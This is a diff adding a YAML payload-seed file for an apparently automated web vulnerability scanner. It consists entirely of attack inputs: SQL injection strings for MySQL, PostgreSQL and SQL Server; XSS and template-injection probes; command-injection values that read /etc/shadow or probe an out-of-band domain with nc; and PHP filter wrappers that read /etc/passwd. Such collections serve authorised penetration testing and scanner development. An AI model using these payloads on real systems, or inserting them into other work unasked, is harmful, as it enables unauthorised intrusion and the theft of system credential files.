@@ -1,0 +1,68 @@
+# aimy-skill advanced payload seeds (layered on top of built-in seeds)
+# Loaded by tools.payload_engine._load_yaml_overrides at first use.
+seeds:
+  sqli:
+    error:
+      - raw: "' AND CAST((SELECT VERSION()) AS SIGNED INT)-- "
+        ctx: ["string"]
+      - raw: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- "
+        ctx: ["string"]
+      - raw: "'; SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END-- "
+        ctx: ["string"]
+      - raw: "' AND 1=(SELECT 1/0)-- "
+        ctx: ["string"]
+    boolean_true:
+      - raw: "' AND 1=1 AND RAND()<1-- "
+        ctx: ["string"]
+      - raw: "1 AND 1=1 AND 1 IN (SELECT 1)-- "
+        ctx: ["numeric"]
+    boolean_false:
+      - raw: "' AND 1=2 AND RAND()<1-- "
+        ctx: ["string"]
+      - raw: "1 AND 1=2 AND 1 IN (SELECT 1)-- "
+        ctx: ["numeric"]
+    time_mysql:
+      - raw: "' AND SLEEP(3) AND 'a'='a"
+        dbms: "MySQL"
+    time_postgres:
+      - raw: "'; SELECT CASE WHEN 1=1 THEN pg_sleep(3) END-- "
+        dbms: "PostgreSQL"
+  xss:
+    html:
+      - raw: "<svg><script>alert(document.domain)</script></svg>"
+        ctx: ["all"]
+      - raw: "<img src=x onerror=alert(1) onmouseover=alert(2)>"
+        ctx: ["all"]
+      - raw: "<math><mtext><img src=x onerror=alert(1)>"
+        ctx: ["all"]
+    attr:
+      - raw: "\\\" autofocus onfocus=alert(1)//"
+        ctx: ["all"]
+  ssti:
+    detect:
+      - raw: "{{7*7}}"
+        indicator: "49"
+        ctx: ["all"]
+      - raw: "<%= 7*7 %>"
+        indicator: "49"
+        ctx: ["all"]
+  cmdi:
+    output:
+      - raw: "; cat /etc/shadow"
+        indicator: "root:"
+        ctx: ["all"]
+      - raw: "; ls -la /etc/"
+        indicator: "passwd"
+        ctx: ["all"]
+    blind_oob:
+      - raw: "; nc -zv {{oob_domain}} 80"
+        type: "dns"
+        ctx: ["all"]
+  lfi:
+    php_wrappers:
+      - raw: "php://filter/read=string.rot13/resource=/etc/passwd"
+        type: "rot13"
+        ctx: ["all"]
+      - raw: "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd"
+        type: "iconv"
+        ctx: ["all"]
